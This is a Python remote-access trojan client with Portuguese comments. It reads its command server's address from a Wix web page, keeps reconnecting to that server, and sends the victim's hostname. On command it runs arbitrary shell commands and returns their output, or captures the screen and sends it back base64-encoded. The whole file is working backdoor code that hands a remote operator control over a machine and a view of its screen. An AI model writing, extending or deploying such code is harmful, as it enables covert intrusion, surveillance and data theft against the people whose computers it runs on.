import os
import socket
import subprocess
import requests
from bs4 import BeautifulSoup
import PIL.ImageGrab
import base64


nome_do_cliente = socket.gethostname()
#hostname = socket.gethostname()
#print(hostname)

#criando função que retorna uma tupla com host e porta do servidor (que foram atualizados no site https://cmdrequ3st.wixsite.com/request)
def pegando_ip_com_webscrapping():
    #definindo um header de navegador para request
    header = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36'}
    #definindo página onde o ip foi publicado
    pagina = requests.get('https://cmdrequ3st.wixsite.com/request', headers=header)

    #alocando o conteúdo html da página na variável soup
    soup = BeautifulSoup(pagina.content, 'html.parser')

    #alocando todo o conteúdo de h1 (um título em html) que tenha um style="font-size:88px;" 
    #na variável ip por exemplo: <h1 class="font_0" style="font-size:88px;">CONTEUDO DO TITULO</h1>
    ip = str(soup.find_all("h1", style="font-size:88px;")[0])

    #pegando só o que importa de h1 apenas manipulando strings (CONTEÚDO DO TITULO)
    
    find = ip.find('>')
    ip = ip[(find + 1):]
    find = ip.find('<')
    ip = ip[:find]
    content = ip.split()
    tupla = (content[0],int(content[1]))
    
    return tupla



while True:
    while True:
        try:
            #--------configuracoes do socket cliente -------------------
            cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #pega uma tupla com ip e porta da função.
            print('a')
            tupla = pegando_ip_com_webscrapping()
            
            #tupla_local = ('127.0.0.1', 8221)
            #conecta o socket do cliente no servidor
            print('b')
            cliente.connect(tupla)
            print('c')
            #SE conseguir conectar ao servidor, recebe uma mensagem do servidor para saber se é o servidor correto
            #SE NÃO conseguir conectar, cai na except e retorna para tentar a conexção novamente no try: acima
            mensagem = cliente.recv(1024).decode()
            #Caso o servidor conecte, independente de ser o servidor certo ou nao, e mande uma mensagem, tratar a 
            #mensagem para saber se é o servidor correto.
            cliente.send(str.encode(nome_do_cliente))
            
            if mensagem != 'Você se conectou com o servidor!':
                #caso o servidor seja diferente, volta para tentar fazer conexão novamente.
                print('Tráfego cruzado! refazendo conexão!')
                pass
            else:
                #caso o servidor seja o correto, quebra o while de conexão e entra na parte de receber instrução do servidor.
                print(mensagem)
                break
        except:
            
            print('Servidor fechado, tentando novamente...')
    #após conexão bem sucedida, e validação do servidor, receber do server um comando.
    try:
        #recebendo comando do servidor
        comando = cliente.recv(1024).decode()
        #comando recebido com sucesso, vamos tratar o comando.
        
        if comando == 'reload':
            #se o comando for reload, o server quer que você encerre conexão com ele e conecte novamente, então, volta para conexão inicial.
            pass
        elif comando == 'free':
            #se o comando for free o servidor está libertando o cliente, encerrando o programa.
            break

        elif comando == 'cmd':
            #se o comando for cmd o servidor mandará em seguida um comando para executar no cmd do cliente
            #caso o comando seja 'leave' volta para conectar novamente com o servidor e junto a todos os outros clientes.
            while True:
                print('esperando comando.....')
                cmd_comando = cliente.recv(1024).decode()
                if cmd_comando != 'leave':
                    cmd = subprocess.Popen(args=cmd_comando, shell=True, stdout=subprocess.PIPE,
                                                        stderr=subprocess.PIPE,
                                                        stdin=subprocess.PIPE)
                    output = (cmd.stdout.read() + cmd.stderr.read()).decode('Utf-8', errors='ignore')
                    if len(output) != 0:
                        cliente.send(str.encode(str(output)))
                    else:
                        cliente.send(str.encode('Comando sem output$'))
                    
                else:
                    #servidor mandou comando 'leave' saindo para reconectar
                    break
        
            
        elif comando == 'screenshot':
            
            print('entrou em screenshot')
            imagem = PIL.ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=False, xdisplay=None)
            print('AQUI1')
            imagem.save("screenshot.png")
            print('AQUI2')
            with open("screenshot.png", "rb") as image2string: 
                byte_converted_string = base64.b64encode(image2string.read())
            print('AQUI3')
            converted_string = str(byte_converted_string, 'utf-8')
            print(f'o tamanho do converted string para confirmar no recebimento do servidor é : {len(converted_string)}')
            print('tentarei enviar ok ?')
            
            
            tamanho = len(converted_string)
            tamanho_pedacos = tamanho//1000
            
            for i in range(0,1000,1):
                if i < 999:
                    cliente.send(str.encode(converted_string[:tamanho_pedacos]))
                    
                    converted_string = converted_string[tamanho_pedacos:]
                else:
                    cliente.send(str.encode(converted_string))
            
            print('Cliente conseguiu enviar')
            os.remove("screenshot.png")
    except Exception as e: print(e)

        
    
print('free')
#cliente.send(str.encode(str(input('Digite sua mensagem:'))))
    
    
    



